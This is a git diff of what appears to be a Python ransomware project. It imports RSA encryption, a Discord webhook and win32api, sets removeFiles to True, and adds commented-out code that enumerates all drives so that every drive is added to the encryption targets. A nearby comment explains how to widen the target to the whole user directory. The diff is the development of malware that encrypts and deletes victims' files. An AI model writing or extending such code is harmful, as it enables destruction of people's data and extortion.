@@ -10,6 +10,7 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from discord_webhook import DiscordWebhook
 import socket
+import win32api
 import sys
 
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
@@ -72,17 +73,16 @@ def menu():
     del Client_private_key
     gc.collect()
 
-    client_public_key_object = RSA.importKey(Client_public_key)
-    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
-
     removeFiles = True
 
-    #   userdata = os.path.expanduser("~")
+    #   drives = win32api.GetLogicalDriveStrings()
+    #   drives = drives.split('\000')[:-1]
 
     paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
 
     #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
-    #   paths.append(userdata)
+    #   for drive in drives:
+    #       paths.append(drive)
 
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
